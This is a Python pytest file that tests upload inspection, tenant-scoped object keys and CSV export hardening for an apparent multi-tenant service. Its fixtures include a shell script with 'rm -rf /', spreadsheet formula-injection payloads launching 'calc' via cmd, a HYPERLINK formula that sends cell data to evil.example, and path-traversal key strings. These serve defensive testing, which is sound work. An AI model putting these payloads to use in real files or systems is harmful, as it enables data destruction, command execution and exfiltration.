"""Content inspection, key derivation and CSV hardening.

Three properties, each of which fails silently if it regresses:

* a macro-bearing workbook renamed to ``.xlsx`` is still refused;
* an object key is always derived from the request-context tenant, never from a caller;
* a generated CSV cannot execute in the recipient's spreadsheet.

The renaming case is the one worth being explicit about. Every OOXML file - ``.xlsx``,
``.xlsm``, ``.docx`` - starts with the same four bytes, so any check that stops at the
signature passes a macro workbook that has been renamed, and renaming is a two-second
operation that a user does for entirely innocent reasons ("it wouldn't let me upload it").
The distinguishing fact is a member *inside* the archive, so the test builds real archives
rather than asserting against fixtures whose provenance nobody can check.
"""

from __future__ import annotations

import io
import uuid
import zipfile

import pytest

from speaker_roi_core.context import RequestContext, request_context
from speaker_roi_core.errors import (
    IngestionRejectedError,
    NotFoundError,
    PayloadTooLargeError,
    UnsupportedMediaTypeError,
)
from speaker_roi_core.storage import (
    ALLOWED_UPLOAD_TYPES,
    ObjectStore,
    assert_upload_acceptable,
    build_object_key,
    neutralise_csv_cell,
    neutralise_csv_rows,
    sniff,
    tenant_owns_key,
)

pytestmark = pytest.mark.security

TENANT = uuid.UUID("11111111-1111-1111-1111-111111111111")
OTHER_TENANT = uuid.UUID("22222222-2222-2222-2222-222222222222")

XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"


@pytest.fixture
def in_tenant():
    ctx = RequestContext(correlation_id="t" * 32, tenant_id=TENANT)
    with request_context(ctx):
        yield ctx


# ---------------------------------------------------------------------------
# Builders. Real archives, so the assertions are about real structure.
# ---------------------------------------------------------------------------


def _ooxml(*, members: dict[str, bytes] | None = None) -> bytes:
    """A minimal but structurally genuine xlsx."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", b"<Types/>")
        z.writestr("_rels/.rels", b"<Relationships/>")
        z.writestr("xl/workbook.xml", b"<workbook/>")
        for name, data in (members or {}).items():
            z.writestr(name, data)
    return buf.getvalue()


def _macro_workbook() -> bytes:
    """An xlsm. Identical to the above in every byte a signature check reads."""
    return _ooxml(members={"xl/vbaProject.bin": b"\x00\x01macro payload"})


# ---------------------------------------------------------------------------
# Content inspection
# ---------------------------------------------------------------------------


def test_a_plain_workbook_is_accepted(in_tenant) -> None:
    inspection = assert_upload_acceptable(_ooxml(), declared_type=XLSX, filename="q3.xlsx")
    assert inspection.detected_type == XLSX
    assert inspection.carries_code is False
    assert inspection.is_allowed_upload


def test_a_macro_workbook_renamed_to_xlsx_is_still_refused(in_tenant) -> None:
    """The rename defeats every check that stops at the four-byte signature.

    This is the case the whole zip-inspection path exists for, and it is not exotic: a user
    whose upload was rejected renames the file, and the macro runs on whoever opens it next.
    """
    with pytest.raises(IngestionRejectedError) as caught:
        assert_upload_acceptable(_macro_workbook(), declared_type=XLSX, filename="q3.xlsx")
    message = caught.value.to_envelope()["error"]["message"]
    assert "macro" in message.lower()
    # The remediation has to be actionable, or the user's next move is another rename.
    assert ".xlsx" in message or "CSV" in message


def test_a_macro_sheet_under_an_unexpected_path_is_caught(in_tenant) -> None:
    """Matched by substring against every member, not by an exact expected path."""
    payload = _ooxml(members={"xl/macrosheets/sheet1.xml": b"<x/>"})
    with pytest.raises(IngestionRejectedError):
        assert_upload_acceptable(payload, declared_type=XLSX, filename="q3.xlsx")


def test_an_executable_renamed_to_csv_is_refused(in_tenant) -> None:
    for payload, label in (
        (b"MZ\x90\x00" + b"\x00" * 200, "windows exe"),
        (b"\x7fELF\x02\x01\x01" + b"\x00" * 200, "elf"),
        (b"#!/bin/sh\nrm -rf /\n", "shell script"),
    ):
        with pytest.raises((IngestionRejectedError, UnsupportedMediaTypeError)) as caught:
            assert_upload_acceptable(payload, declared_type="text/csv", filename="data.csv")
        assert caught.value.status_code in {415, 422}, label


def test_a_bare_zip_is_not_mistaken_for_a_workbook(in_tenant) -> None:
    """A zip with no OOXML relationship parts is a zip, whatever it is named."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("notes.txt", b"hello")
    with pytest.raises(UnsupportedMediaTypeError) as caught:
        assert_upload_acceptable(buf.getvalue(), declared_type=XLSX, filename="q3.xlsx")
    envelope = caught.value.to_envelope()["error"]
    # The caller is told what it actually is and what would be accepted - otherwise the
    # next attempt is another rename.
    assert "zip" in envelope["message"].lower()
    assert envelope["context"]["accepted_types"]


def test_the_declared_type_can_never_widen_the_result(in_tenant) -> None:
    """A caller declaring ``text/csv`` over executable bytes does not get a CSV."""
    inspection = sniff(b"MZ\x90\x00" + b"\x00" * 100, declared_type="text/csv", filename="a.csv")
    assert inspection.carries_code is True
    assert inspection.detected_type not in ALLOWED_UPLOAD_TYPES


def test_a_renamed_binary_is_not_treated_as_text(in_tenant) -> None:
    """The NUL check is what catches a binary with no recognised signature.

    Without it an unknown binary decodes far enough under a permissive codec to look like
    text, and then gets stored and handed to the CSV parser.
    """
    payload = b"\x89\x00\x01\x02random binary with no magic" + bytes(range(256))
    with pytest.raises(UnsupportedMediaTypeError):
        assert_upload_acceptable(payload, declared_type="text/csv", filename="data.csv")


def test_a_real_csv_is_accepted_despite_having_no_signature(in_tenant) -> None:
    """There is no magic number for CSV, so the filename is allowed to break the tie.

    This is the one place a client hint is consulted, and it is safe because it can only
    choose between two text types - it cannot rescue a payload that failed the binary check.
    """
    payload = b"hcp_id,month,trx\nH001,2026-01,14\nH002,2026-01,9\n"
    inspection = assert_upload_acceptable(payload, declared_type="text/csv", filename="d.csv")
    assert inspection.detected_type == "text/csv"


def test_a_zip_bomb_is_refused_without_being_decompressed(in_tenant) -> None:
    """Read from the central directory, so the claimed expanded size is enough to refuse on.

    Extracting first to measure is the obvious implementation and it is the vulnerability:
    the file is a few kilobytes and the extraction is what exhausts the host.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", b"<Types/>")
        z.writestr("_rels/.rels", b"<Relationships/>")
        z.writestr("xl/workbook.xml", b"<workbook/>")
        z.writestr("bomb", b"\x00" * (300 * 1024 * 1024))
    payload = buf.getvalue()
    assert len(payload) < 2 * 1024 * 1024, "the compressed bomb should be small"
    with pytest.raises(UnsupportedMediaTypeError):
        assert_upload_acceptable(payload, declared_type=XLSX, filename="q3.xlsx")


def test_an_empty_file_is_refused_with_a_clear_reason(in_tenant) -> None:
    with pytest.raises(IngestionRejectedError) as caught:
        assert_upload_acceptable(b"", declared_type="text/csv", filename="d.csv")
    assert "empty" in caught.value.to_envelope()["error"]["message"].lower()


def test_the_size_limit_is_reported_in_readable_units(in_tenant) -> None:
    """A limit stated only in bytes makes the reader do arithmetic before they can act."""
    from speaker_roi_core.config import Settings

    settings = Settings(app_env="test")
    oversized = b"a,b\n" + b"1,2\n" * (settings.storage.max_upload_bytes // 4 + 1)
    with pytest.raises(PayloadTooLargeError) as caught:
        assert_upload_acceptable(oversized, declared_type="text/csv", filename="d.csv")
    envelope = caught.value.to_envelope()["error"]
    assert "MB" in envelope["message"]
    assert envelope["context"]["limit_bytes"] == settings.storage.max_upload_bytes
    assert envelope["remediation"]


def test_no_rejection_ever_echoes_file_content() -> None:
    """plan.md §15: never log or return file contents. A refusal is a tempting place to.

    "Row 4 is invalid: <the row>" is the natural error message and it puts patient-adjacent
    free text into a response body and an error-tracking service.
    """
    secret = b"hcp_id,patient_name,phone\nH1,A. Patient,9876543210\n\x00binary"
    with (
        pytest.raises(UnsupportedMediaTypeError) as caught,
        request_context(RequestContext(correlation_id="x" * 32, tenant_id=TENANT)),
    ):
        assert_upload_acceptable(secret, declared_type="text/csv", filename="d.csv")
    blob = repr(caught.value.to_envelope()) + repr(caught.value.log_fields())
    assert "A. Patient" not in blob
    assert "9876543210" not in blob


# ---------------------------------------------------------------------------
# Key derivation and tenant ownership
# ---------------------------------------------------------------------------

DIGEST = "a" * 64


def test_the_key_is_prefixed_with_the_context_tenant(in_tenant) -> None:
    key = build_object_key(role="uploads", sha256=DIGEST, content_type="text/csv")
    assert key.startswith(f"{TENANT}/uploads/")
    assert key.endswith(".csv")


def test_a_traversal_style_digest_cannot_reach_another_prefix(in_tenant) -> None:
    """The digest is the only key component a caller ever influences, so it is validated.

    ``../22222222-.../uploads/x`` is not a filesystem escape - it is a perfectly valid S3
    key that lands exactly where its author intended.
    """
    for hostile in ("../" + "a" * 61, f"../{OTHER_TENANT}/uploads/x", "a" * 63, "A" * 64, ""):
        with pytest.raises(ValueError, match="64 lowercase hex"):
            build_object_key(role="uploads", sha256=hostile, content_type="text/csv")


def test_ownership_is_checked_on_a_path_boundary_not_a_prefix(in_tenant) -> None:
    """``startswith`` without the slash lets one tenant id prefix-match another.

    These are hex strings, so a shared leading run is not a rare coincidence.
    """
    assert tenant_owns_key(f"{TENANT}/uploads/ab/{DIGEST}.csv") is True
    assert tenant_owns_key(f"{OTHER_TENANT}/uploads/ab/{DIGEST}.csv") is False
    # The case the slash exists for: a longer id that starts with ours.
    assert tenant_owns_key(f"{TENANT}9/uploads/ab/{DIGEST}.csv") is False


async def test_a_cross_tenant_key_is_refused_as_a_miss(in_tenant) -> None:
    """404, not 403. The key contains the content digest, so confirming it exists tells the
    caller that a specific file was uploaded by a specific other tenant."""

    class Unreachable:
        def __getattr__(self, name):  # pragma: no cover - must never be called
            raise AssertionError(f"the store was contacted despite the ownership check: {name}")

    store = ObjectStore(client=Unreachable())
    foreign = f"{OTHER_TENANT}/uploads/ab/{DIGEST}.csv"
    for call in (
        store.get(role="uploads", key=foreign),
        store.exists(role="uploads", key=foreign),
        store.presign_download(role="uploads", key=foreign, filename="x.csv"),
        store.delete(role="uploads", key=foreign),
    ):
        with pytest.raises(NotFoundError) as caught:
            await call
        body = repr(caught.value.to_envelope())
        assert str(OTHER_TENANT) not in body
        assert "tenant" not in body.lower()


# ---------------------------------------------------------------------------
# CSV export hardening
# ---------------------------------------------------------------------------

FORMULA_PAYLOADS = (
    "=cmd|' /c calc'!A1",
    "@SUM(1+9)*cmd|' /c calc'!A1",
    "+1+1",
    "-2+3+cmd|' /c calc'!A1",
    "\t=1+1",
    "\r=1+1",
    '=HYPERLINK("http://evil.example?d="&A1,"click")',
)


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_formula_payloads_are_neutralised(payload: str) -> None:
    out = neutralise_csv_cell(payload)
    assert out.startswith("'")
    assert out[1:] == payload, "the value must be preserved, only prefixed"


def test_legitimate_values_keep_their_meaning() -> None:
    """The reason this prefixes rather than strips.

    ``-40%`` is a real number in a real report, and deleting the sign silently changes the
    figure a reader acts on. That is a worse failure than a stray apostrophe.
    """
    assert neutralise_csv_cell("-40%") == "'-40%"
    assert neutralise_csv_cell("-40%")[1:] == "-40%"
    # Values that were never dangerous are untouched entirely.
    for benign in ("Dr Mehta", "2026-01", "1420", "0.75", "in-person", ""):
        assert neutralise_csv_cell(benign) == benign


def test_none_becomes_empty_rather_than_the_word_none() -> None:
    """``None`` rendered as "None" in an exported report is a data-quality bug in the file."""
    assert neutralise_csv_cell(None) == ""


def test_rows_are_neutralised_lazily() -> None:
    """An export is streamed; materialising it defeats the point."""
    import types

    rows = neutralise_csv_rows([["=1+1", "ok"], ["-2", None]])
    assert isinstance(rows, types.GeneratorType)
    assert list(rows) == [["'=1+1", "ok"], ["'-2", ""]]
